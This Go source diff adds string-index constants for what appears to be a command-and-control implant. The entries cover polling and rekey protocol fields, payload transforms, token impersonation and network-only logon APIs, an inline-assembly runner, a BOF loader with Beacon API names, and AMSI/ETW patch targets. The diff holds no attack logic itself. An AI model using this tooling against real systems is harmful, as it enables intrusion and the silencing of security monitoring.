@@ -37,7 +37,7 @@ const (
 )
 
 // MaxTemplateSize ensures all indices have values across all command types
-const MaxTemplateSize = 710
+const MaxTemplateSize = 1100
 
 // ============================================================================
 // SHELL TEMPLATE INDICES (100-119)
@@ -114,6 +114,9 @@ const (
 	IdxLinkFmtList      = 344 // Active Links (%d):\n
 	IdxLinkFmtRow       = 345 // [%s] %s - %s (connected: %s, last seen: %s)\n
 	IdxLinkTimeFmt      = 346 // 15:04:05
+	IdxLinkColon        = 347 // :
+	IdxLinkPipe         = 348 // |
+	IdxLinkBackslash    = 349 // \
 
 	_linkEnd = 139 // Core link indices end at 139
 )
@@ -227,6 +230,10 @@ const (
 	IdxLsWinRecovery    = 223 // Recovery
 	IdxLsWinProgramData = 224 // ProgramData
 
+	// Size units and paths
+	IdxLsSizeUnits = 225 // KMGTPE
+	IdxLsWinRoot   = 226 // C:\
+
 	_lsEnd = 239
 )
 
@@ -328,7 +335,15 @@ const (
 	IdxExecReqWordTrue    = 318 // true
 	IdxExecReqTimeFmtFull = 319 // 2006-01-02 15:04:05
 
-	_execReqEnd = 319
+	// Additional environment variables (for codes.go)
+	IdxExecReqEnvHostname = 320 // HOSTNAME
+	IdxExecReqEnvShell    = 321 // SHELL
+
+	// System info strings (for getSystemInfo.go)
+	IdxExecReqSysInfoStartupTime  = 322 // startup_time
+	IdxExecReqSysInfoStatusActive = 323 // active
+
+	_execReqEnd = 339
 )
 
 // ============================================================================
@@ -606,6 +621,14 @@ const (
 	IdxR2sTokensStored = 540 // \n
 	IdxR2sTokensSuffix = 541 // " token(s) stored"
 
+	// DLL/API names (542-547)
+	IdxR2sMprDll          = 542 // mpr.dll
+	IdxR2sWNetCancelConn2 = 543 // WNetCancelConnection2W
+	IdxR2sWNetOpenEnum    = 544 // WNetOpenEnumW
+	IdxR2sWNetEnumRes     = 545 // WNetEnumResourceW
+	IdxR2sWNetCloseEnum   = 546 // WNetCloseEnum
+	IdxR2sWNetGetConn     = 547 // WNetGetConnectionW
+
 	_rev2selfEnd = 569
 )
 
@@ -746,6 +769,466 @@ const (
 	IdxPtyRoot      = 703 // root
 
 	_ptyHelperEnd = 709
+)
+
+// ============================================================================
+// COMMUNICATIONS TEMPLATE INDICES (710-759) - for polling.go and http.go
+// ============================================================================
+const (
+	// HTTP headers (710-716)
+	IdxCommsUserAgent   = 710 // User-Agent
+	IdxCommsContentType = 711 // Content-Type
+	IdxCommsPadPre      = 712 // X-Pad-Pre
+	IdxCommsPadApp      = 713 // X-Pad-App
+	IdxCommsMetaId      = 714 // id
+	IdxCommsEncryption  = 715 // encryption
+	IdxCommsEncRsaAes   = 716 // rsa+aes
+
+	// Polling protocol (720-728)
+	IdxPollAppJson       = 720 // application/json
+	IdxPollStatus        = 721 // status
+	IdxPollRekey         = 722 // rekey
+	IdxPollNoCommands    = 723 // no_commands
+	IdxPollAgentId       = 724 // agent_id
+	IdxPollResults       = 725 // results
+	IdxPollType          = 726 // type
+	IdxPollPayload       = 727 // payload
+	IdxPollHandshakeResp = 728 // handshake_response
+
+	_commsEnd = 759
+)
+
+// ============================================================================
+// TRANSFORM TEMPLATE INDICES (760-779) - for transforms.go
+// ============================================================================
+const (
+	// Transform type codes (single char to minimize binary size)
+	IdxTransBase64    = 760 // a
+	IdxTransBase64URL = 761 // b
+	IdxTransHex       = 762 // c
+	IdxTransGzip      = 763 // d
+	IdxTransNetBIOS   = 764 // e
+	IdxTransXOR       = 765 // f
+	IdxTransPrepend   = 766 // g
+	IdxTransAppend    = 767 // h
+	IdxTransRandPre   = 768 // i
+	IdxTransRandApp   = 769 // j
+
+	// Charset codes
+	IdxCharsetNum   = 770 // 1
+	IdxCharsetAlpha = 771 // 2
+	IdxCharsetAlnum = 772 // 3
+	IdxCharsetHex   = 773 // 4
+
+	_transformEnd = 779
+)
+
+// ============================================================================
+// COMMAND QUEUE TEMPLATE INDICES (780-799) - for command_queue.go
+// ============================================================================
+const (
+	IdxCqWordWindows = 780 // windows
+	IdxCqShellCmd    = 781 // cmd
+	IdxCqShellCmdArg = 782 // /c
+	IdxCqShellSh     = 783 // sh
+	IdxCqShellShArg  = 784 // -c
+	IdxCqCmdDownload = 785 // download
+	IdxCqCmdUpload   = 786 // upload
+
+	_cmdQueueEnd = 799
+)
+
+// ============================================================================
+// INLINE ASSEMBLY WINDOWS API TEMPLATE INDICES (800-829)
+// ============================================================================
+const (
+	// DLL names (800-803)
+	IdxIADllKernel32 = 800 // kernel32.dll
+	IdxIADllOle32    = 801 // ole32.dll
+	IdxIADllUser32   = 802 // user32.dll
+	IdxIADllMsvcrt   = 803 // msvcrt.dll
+
+	// API function names (804-821)
+	IdxIAFnGetStdHandle          = 804 // GetStdHandle
+	IdxIAFnSetStdHandle          = 805 // SetStdHandle
+	IdxIAFnAllocConsole          = 806 // AllocConsole
+	IdxIAFnFreeConsole           = 807 // FreeConsole
+	IdxIAFnGetConsoleWindow      = 808 // GetConsoleWindow
+	IdxIAFnPeekNamedPipe         = 809 // PeekNamedPipe
+	IdxIAFnCreateFileW           = 810 // CreateFileW
+	IdxIAFnCreateFileA           = 811 // CreateFileA
+	IdxIAFnCloseHandle           = 812 // CloseHandle
+	IdxIAFnReadFile              = 813 // ReadFile
+	IdxIAFnWriteFile             = 814 // WriteFile
+	IdxIAFnCoInitializeEx        = 815 // CoInitializeEx
+	IdxIAFnCoUninitialize        = 816 // CoUninitialize
+	IdxIAFnFlushInstructionCache = 817 // FlushInstructionCache
+	IdxIAFnShowWindow            = 818 // ShowWindow
+	IdxIAFnOpenOsfhandle         = 819 // _open_osfhandle
+	IdxIAFnDup2                  = 820 // _dup2
+	IdxIAFnClose                 = 821 // _close
+
+	_iaWinApiEnd = 829
+)
+
+// ============================================================================
+// INLINE ASSEMBLY CORE STRINGS (830-849) - for inline_assembly.go
+// ============================================================================
+const (
+	IdxIAOsWindows       = 830 // windows
+	IdxIACmdName         = 831 // inline-assembly
+	IdxIACmdNameAsync    = 832 // inline-assembly-async
+	IdxIATypeExe         = 833 // EXE
+	IdxIATypeDll         = 834 // DLL
+	IdxIAJobPrefix       = 835 // inline_asm_%d
+	IdxIATerminated      = 836 // terminated by user
+	IdxIAExitCodeLabel   = 837 // Exit code:
+	IdxIAFmtDoneCode     = 838 // \nDone (code: %d)\n
+	IdxIAFmtStartedID    = 839 // Started (ID: %s)
+	IdxIAFmtExecFail     = 840 // \n[!] Execution failed: %v\n
+	IdxIAFmtExecDone     = 841 // \n[+] Execution completed (exit code: %d)\n
+	IdxIAFmtAsyncStarted = 842 // Async inline assembly execution started (Job ID: %s)\n
+	IdxIAFmtOutputHint   = 843 // Use 'inline-assembly-output %s' to retrieve output
+
+	_iaCoreStringsEnd = 849
+)
+
+// ============================================================================
+// WINDOWS EXEC REQUIREMENTS TEMPLATE INDICES (500-549)
+// ============================================================================
+const (
+	// DLL names (500-501)
+	IdxExecReqWinDllNetapi32 = 500 // netapi32.dll
+	IdxExecReqWinDllSecur32  = 501 // secur32.dll
+
+	// Proc names (502-504)
+	IdxExecReqWinProcNetGetJoinInfo = 502 // NetGetJoinInformation
+	IdxExecReqWinProcNetApiBufFree  = 503 // NetApiBufferFree
+	IdxExecReqWinProcGetUserNameEx  = 504 // GetUserNameExW
+
+	// Environment variable names (505-509)
+	IdxExecReqWinEnvUsername    = 505 // USERNAME
+	IdxExecReqWinEnvUserDnsDom  = 506 // USERDNSDOMAIN
+	IdxExecReqWinEnvUserDomain  = 507 // USERDOMAIN
+	IdxExecReqWinEnvLogonServer = 508 // LOGONSERVER
+	IdxExecReqWinEnvUserProfile = 509 // USERPROFILE
+
+	// String literals (510-514)
+	IdxExecReqWinWordTrue      = 510 // true
+	IdxExecReqWinWordExe       = 511 // .exe
+	IdxExecReqWinPathTildeBack = 512 // ~\
+	IdxExecReqWinPathTildeFwd  = 513 // ~/
+	IdxExecReqWinDoubleBacksl  = 514 // \\
+
+	// Time format strings (515-516)
+	IdxExecReqWinTimeFmtFull = 515 // 2006-01-02 15:04:05
+	IdxExecReqWinTimeFmtDate = 516 // 2006-01-02
+
+	// Additional environment variables (517)
+	IdxExecReqWinEnvComputername = 517 // COMPUTERNAME
+
+	_winExecReqEnd = 549
+)
+
+// ============================================================================
+// DARWIN EXEC REQUIREMENTS TEMPLATE INDICES (400-449)
+// ============================================================================
+const (
+	// Command names
+	IdxExecReqDarCmdScutil     = 400 // scutil
+	IdxExecReqDarCmdDsconfigad = 401 // dsconfigad
+	IdxExecReqDarCmdDscl       = 402 // dscl
+	IdxExecReqDarCmdPs         = 403 // ps
+	IdxExecReqDarCmdPgrep      = 404 // pgrep
+
+	// Command arguments
+	IdxExecReqDarArgGet       = 405 // --get
+	IdxExecReqDarArgLocalHost = 406 // LocalHostName
+	IdxExecReqDarArgShow      = 407 // -show
+	IdxExecReqDarArgLocalhost = 408 // localhost
+	IdxExecReqDarArgList      = 409 // -list
+	IdxExecReqDarArgActiveDir = 410 // /Active Directory
+	IdxExecReqDarArgRead      = 411 // -read
+	IdxExecReqDarArgSlash     = 412 // /
+	IdxExecReqDarArgAux       = 413 // aux
+	IdxExecReqDarArgCaseI     = 414 // -i
+
+	// Environment variable names
+	IdxExecReqDarEnvUser    = 415 // USER
+	IdxExecReqDarEnvLogname = 416 // LOGNAME
+
+	// File paths
+	IdxExecReqDarPathKrb5Conf    = 417 // /etc/krb5.conf
+	IdxExecReqDarPathMitKerberos = 418 // /Library/Preferences/edu.mit.Kerberos
+	IdxExecReqDarPathTildeFwd    = 419 // ~/
+
+	// String patterns
+	IdxExecReqDarPatternADDomain   = 420 // Active Directory Domain =
+	IdxExecReqDarPatternDefRealm   = 421 // default_realm
+	IdxExecReqDarPatternServerConn = 422 // ServerConnection:
+
+	// String literals
+	IdxExecReqDarWordTrue    = 423 // true
+	IdxExecReqDarTimeFmtFull = 424 // 2006-01-02 15:04:05
+
+	_darwinExecReqEnd = 449
+)
+
+// ============================================================================
+// NETONLY FILE SUPPORT TEMPLATE INDICES (850-869) - Windows only
+// ============================================================================
+const (
+	// Windows API proc name
+	IdxNfProcGetDriveType = 850 // GetDriveTypeW
+
+	// UNC path prefixes
+	IdxNfUncPrefix    = 851 // \\
+	IdxNfUncPrefixAlt = 852 // //
+
+	// Drive root suffix
+	IdxNfDriveRootSuffix = 853 // :\
+
+	// Format string for network-only token message
+	IdxNfFmtNetOnlyToken = 854 // Using network-only token '%s' (%s\%s) for: %s\n
+
+	// Network token wrapper format strings (855-865)
+	IdxNfFmtUsingNetToken   = 855 // Using network-only token: %s\n
+	IdxNfFmtExecNetToken    = 856 // Executing with network-only token: %s\n
+	IdxNfFmtProcComplete    = 857 // Process %d completed with exit code %d\n
+	IdxNfFmtUser            = 858 //     User: %s\n\n
+	IdxNfMsgCmdExecNetToken = 859 // Command executed with network-only token\n
+	IdxNfCmdNet             = 860 // net
+	IdxNfFmtCmdRedirect     = 861 // cmd.exe /c %s > "%s" 2>&1
+	IdxNfFmtTempFile        = 862 // %s\netonly_output_%d.txt
+	IdxNfPlaceholderUser    = 863 // DOMAIN\User
+
+	_netOnlyFileSupportEnd = 869
+)
+
+// ============================================================================
+// WINDOWS COMMON API TEMPLATE INDICES (1020-1059) - for windows_common.go
+// ============================================================================
+const (
+	// DLL names (1020-1024)
+	IdxWcDllAdvapi32 = 1020 // advapi32.dll
+	IdxWcDllKernel32 = 1021 // kernel32.dll
+	IdxWcDllNtdll    = 1022 // ntdll.dll
+	IdxWcDllUser32   = 1023 // user32.dll
+	IdxWcDllPsapi    = 1024 // psapi.dll
+
+	// Advapi32 function names (1025-1038)
+	IdxWcFnGetUserNameW            = 1025 // GetUserNameW
+	IdxWcFnOpenProcessToken        = 1026 // OpenProcessToken
+	IdxWcFnOpenThreadToken         = 1027 // OpenThreadToken
+	IdxWcFnDuplicateTokenEx        = 1028 // DuplicateTokenEx
+	IdxWcFnImpersonateLoggedOnUser = 1029 // ImpersonateLoggedOnUser
+	IdxWcFnRevertToSelf            = 1030 // RevertToSelf
+	IdxWcFnGetTokenInformation     = 1031 // GetTokenInformation
+	IdxWcFnLookupAccountSidW       = 1032 // LookupAccountSidW
+	IdxWcFnLogonUserW              = 1033 // LogonUserW
+	IdxWcFnLogonUserExW            = 1034 // LogonUserExW
+	IdxWcFnCreateProcessAsUserW    = 1035 // CreateProcessAsUserW
+	IdxWcFnCreateProcessWithTokenW = 1036 // CreateProcessWithTokenW
+	IdxWcFnAdjustTokenPrivileges   = 1037 // AdjustTokenPrivileges
+	IdxWcFnLookupPrivilegeValueW   = 1038 // LookupPrivilegeValueW
+
+	// Kernel32 function names (1039-1051)
+	IdxWcFnOpenProcess              = 1039 // OpenProcess
+	IdxWcFnCloseHandle              = 1040 // CloseHandle
+	IdxWcFnGetCurrentProcess        = 1041 // GetCurrentProcess
+	IdxWcFnGetCurrentProcessId      = 1042 // GetCurrentProcessId
+	IdxWcFnGetCurrentThread         = 1043 // GetCurrentThread
+	IdxWcFnTerminateProcess         = 1044 // TerminateProcess
+	IdxWcFnGetExitCodeProcess       = 1045 // GetExitCodeProcess
+	IdxWcFnWaitForSingleObject      = 1046 // WaitForSingleObject
+	IdxWcFnCreateToolhelp32Snapshot = 1047 // CreateToolhelp32Snapshot
+	IdxWcFnProcess32FirstW          = 1048 // Process32FirstW
+	IdxWcFnProcess32NextW           = 1049 // Process32NextW
+	IdxWcFnGetEnvironmentStringsW   = 1050 // GetEnvironmentStringsW
+	IdxWcFnFreeEnvironmentStringsW  = 1051 // FreeEnvironmentStringsW
+
+	_winCommonApiEnd = 1059
+)
+
+// ============================================================================
+// COFF LOADER TEMPLATE INDICES (870-1017) - BOF beacon API names
+// ============================================================================
+const (
+	// DLL names (870-874)
+	IdxCoffDllKernel32 = 870 // kernel32.dll
+	IdxCoffDllNtdll    = 871 // ntdll.dll
+	IdxCoffDllUser32   = 872 // user32.dll
+	IdxCoffDllWs2_32   = 873 // ws2_32.dll
+	IdxCoffDllAdvapi32 = 874 // advapi32.dll
+
+	// Prefixes/suffixes (875-878)
+	IdxCoffPrefixImp  = 875 // __imp_
+	IdxCoffSuffixDll  = 876 // .dll
+	IdxCoffPrefixUs   = 877 // _
+	IdxCoffSectionBss = 878 // .bss
+
+	// Kernel32 API names (880-917)
+	IdxCoffApiFreeLibrary            = 880 // FreeLibrary
+	IdxCoffApiLoadLibraryA           = 881 // LoadLibraryA
+	IdxCoffApiGetProcAddress         = 882 // GetProcAddress
+	IdxCoffApiGetModuleHandleA       = 883 // GetModuleHandleA
+	IdxCoffApiGetModuleFileNameA     = 884 // GetModuleFileNameA
+	IdxCoffApiVirtualAlloc           = 885 // VirtualAlloc
+	IdxCoffApiVirtualFree            = 886 // VirtualFree
+	IdxCoffApiVirtualProtect         = 887 // VirtualProtect
+	IdxCoffApiSetLastError           = 888 // SetLastError
+	IdxCoffApiGetCurrentProcess      = 889 // GetCurrentProcess
+	IdxCoffApiGetProcessHeap         = 890 // GetProcessHeap
+	IdxCoffApiHeapAlloc              = 891 // HeapAlloc
+	IdxCoffApiHeapFree               = 892 // HeapFree
+	IdxCoffApiWideCharToMultiByte    = 893 // WideCharToMultiByte
+	IdxCoffApiGetCurrentThread       = 894 // GetCurrentThread
+	IdxCoffApiGetThreadContext       = 895 // GetThreadContext
+	IdxCoffApiSetThreadContext       = 896 // SetThreadContext
+	IdxCoffApiSuspendThread          = 897 // SuspendThread
+	IdxCoffApiResumeThread           = 898 // ResumeThread
+	IdxCoffApiCreateThread           = 899 // CreateThread
+	IdxCoffApiExitThread             = 900 // ExitThread
+	IdxCoffApiGetSystemTime          = 901 // GetSystemTime
+	IdxCoffApiGetLocalTime           = 902 // GetLocalTime
+	IdxCoffApiGetFileAttributesA     = 903 // GetFileAttributesA
+	IdxCoffApiSetFileAttributesA     = 904 // SetFileAttributesA
+	IdxCoffApiCreateFileA            = 905 // CreateFileA
+	IdxCoffApiReadFile               = 906 // ReadFile
+	IdxCoffApiWriteFile              = 907 // WriteFile
+	IdxCoffApiCloseHandle            = 908 // CloseHandle
+	IdxCoffApiGetFileSize            = 909 // GetFileSize
+	IdxCoffApiGetFileSizeEx          = 910 // GetFileSizeEx
+	IdxCoffApiFileTimeToSystemTime   = 911 // FileTimeToSystemTime
+	IdxCoffApiSystemTimeToTzSpecific = 912 // SystemTimeToTzSpecificLocalTime
+	IdxCoffApiFindFirstFileA         = 913 // FindFirstFileA
+	IdxCoffApiFindNextFileA          = 914 // FindNextFileA
+	IdxCoffApiFindClose              = 915 // FindClose
+	IdxCoffApiGetLastError           = 916 // GetLastError
+	IdxCoffApiRtlCopyMemory          = 917 // RtlCopyMemory
+
+	// MSVCRT/String functions (918-927)
+	IdxCoffFnStrlen   = 918 // strlen
+	IdxCoffFnStrcmp   = 919 // strcmp
+	IdxCoffFnStrncmp  = 920 // strncmp
+	IdxCoffFnStricmp  = 921 // _stricmp
+	IdxCoffFnStrnicmp = 922 // _strnicmp
+	IdxCoffFnStrcpy   = 923 // strcpy
+	IdxCoffFnStrncpy  = 924 // strncpy
+	IdxCoffFnStrcat   = 925 // strcat
+	IdxCoffFnStrncat  = 926 // strncat
+	IdxCoffFnStrstr   = 927 // strstr
+
+	// Memory functions (928-935)
+	IdxCoffFnCalloc  = 928 // calloc
+	IdxCoffFnMalloc  = 929 // malloc
+	IdxCoffFnFree    = 930 // free
+	IdxCoffFnRealloc = 931 // realloc
+	IdxCoffFnMemcpy  = 932 // memcpy
+	IdxCoffFnMemset  = 933 // memset
+	IdxCoffFnMemmove = 934 // memmove
+	IdxCoffFnMemcmp  = 935 // memcmp
+
+	// Printf functions (936-938)
+	IdxCoffFnVsnprintf  = 936 // vsnprintf
+	IdxCoffFnVsnprintfU = 937 // _vsnprintf
+	IdxCoffFnSprintf    = 938 // sprintf
+
+	// User32 functions (939-946)
+	IdxCoffApiMessageBoxA      = 939 // MessageBoxA
+	IdxCoffApiMessageBoxW      = 940 // MessageBoxW
+	IdxCoffApiGetDesktopWindow = 941 // GetDesktopWindow
+	IdxCoffApiGetForegroundWnd = 942 // GetForegroundWindow
+	IdxCoffApiGetWindowTextA   = 943 // GetWindowTextA
+	IdxCoffApiGetWindowTextW   = 944 // GetWindowTextW
+	IdxCoffApiFindWindowA      = 945 // FindWindowA
+	IdxCoffApiFindWindowW      = 946 // FindWindowW
+
+	// WS2_32 functions (947-968)
+	IdxCoffApiWSAStartup    = 947 // WSAStartup
+	IdxCoffApiWSACleanup    = 948 // WSACleanup
+	IdxCoffApiWSAGetLastErr = 949 // WSAGetLastError
+	IdxCoffApiSocket        = 950 // socket
+	IdxCoffApiClosesocket   = 951 // closesocket
+	IdxCoffApiBind          = 952 // bind
+	IdxCoffApiListen        = 953 // listen
+	IdxCoffApiAccept        = 954 // accept
+	IdxCoffApiConnect       = 955 // connect
+	IdxCoffApiSend          = 956 // send
+	IdxCoffApiRecv          = 957 // recv
+	IdxCoffApiSendto        = 958 // sendto
+	IdxCoffApiRecvfrom      = 959 // recvfrom
+	IdxCoffApiSelect        = 960 // select
+	IdxCoffApiGethostbyname = 961 // gethostbyname
+	IdxCoffApiGethostbyaddr = 962 // gethostbyaddr
+	IdxCoffApiInet_addr     = 963 // inet_addr
+	IdxCoffApiInet_ntoa     = 964 // inet_ntoa
+	IdxCoffApiHtons         = 965 // htons
+	IdxCoffApiHtonl         = 966 // htonl
+	IdxCoffApiNtohs         = 967 // ntohs
+	IdxCoffApiNtohl         = 968 // ntohl
+
+	// Advapi32 functions (969-977)
+	IdxCoffApiRegOpenKeyExA        = 969 // RegOpenKeyExA
+	IdxCoffApiRegCloseKey          = 970 // RegCloseKey
+	IdxCoffApiRegQueryValueExA     = 971 // RegQueryValueExA
+	IdxCoffApiRegSetValueExA       = 972 // RegSetValueExA
+	IdxCoffApiOpenProcessToken     = 973 // OpenProcessToken
+	IdxCoffApiGetTokenInformation  = 974 // GetTokenInformation
+	IdxCoffApiSetTokenInformation  = 975 // SetTokenInformation
+	IdxCoffApiDuplicateTokenEx     = 976 // DuplicateTokenEx
+	IdxCoffApiCreateProcessAsUserA = 977 // CreateProcessAsUserA
+
+	// Beacon API functions (978-990)
+	IdxCoffFnBeaconOutput       = 978 // BeaconOutput
+	IdxCoffFnBeaconDataParse    = 979 // BeaconDataParse
+	IdxCoffFnBeaconDataInt      = 980 // BeaconDataInt
+	IdxCoffFnBeaconDataShort    = 981 // BeaconDataShort
+	IdxCoffFnBeaconDataLength   = 982 // BeaconDataLength
+	IdxCoffFnBeaconDataExtract  = 983 // BeaconDataExtract
+	IdxCoffFnBeaconPrintf       = 984 // BeaconPrintf
+	IdxCoffFnBeaconFormatAlloc  = 985 // BeaconFormatAlloc
+	IdxCoffFnBeaconFormatFree   = 986 // BeaconFormatFree
+	IdxCoffFnBeaconFormatAppend = 987 // BeaconFormatAppend
+	IdxCoffFnBeaconFormatPrintf = 988 // BeaconFormatPrintf
+	IdxCoffFnBeaconFormatToStr  = 989 // BeaconFormatToString
+	IdxCoffFnBeaconFormatInt    = 990 // BeaconFormatInt
+
+	// Helper functions (991-999)
+	IdxCoffFnBofstart       = 991 // bofstart
+	IdxCoffFnInternalPrintf = 992 // internal_printf
+	IdxCoffFnPrintoutput    = 993 // printoutput
+	IdxCoffFnIntAlloc       = 994 // intAlloc
+	IdxCoffFnIntFree        = 995 // intFree
+	IdxCoffFnIntMemset      = 996 // intMemset
+	IdxCoffFnIntMemcpy      = 997 // intMemcpy
+	IdxCoffFnIntRealloc     = 998 // intRealloc
+	IdxCoffFnIntStrlen      = 999 // intStrlen
+
+	_coffLoaderEnd = 999
+)
+
+// ============================================================================
+// COFF LOADER TEMPLATE INDICES CONTINUED (1000-1017)
+// ============================================================================
+const (
+	IdxCoffFnIntStrcmp    = 1000 // intStrcmp
+	IdxCoffFnIntStrncmp   = 1001 // intStrncmp
+	IdxCoffFnIntStrcpy    = 1002 // intStrcpy
+	IdxCoffFnIntStrncpy   = 1003 // intStrncpy
+	IdxCoffFnIntStrcat    = 1004 // intStrcat
+	IdxCoffFnIntStrncat   = 1005 // intStrncat
+	IdxCoffFnToWideChar   = 1006 // toWideChar
+	IdxCoffFnUtf8ToUtf16  = 1007 // Utf8ToUtf16
+	IdxCoffFnUtf16ToUtf8  = 1008 // Utf16ToUtf8
+
+	// Patches strings (used by patches.go for AMSI/ETW)
+	IdxPatchAmsiDll           = 1010 // amsi.dll
+	IdxPatchAmsiScanBuffer    = 1011 // AmsiScanBuffer
+	IdxPatchEtwEventWrite     = 1012 // EtwEventWrite
+	IdxPatchNtProtectVirtMem  = 1013 // NtProtectVirtualMemory
+
+	_coffLoaderExtendedEnd = 1017
 )
 
 // ToJSON serializes the template to JSON bytes
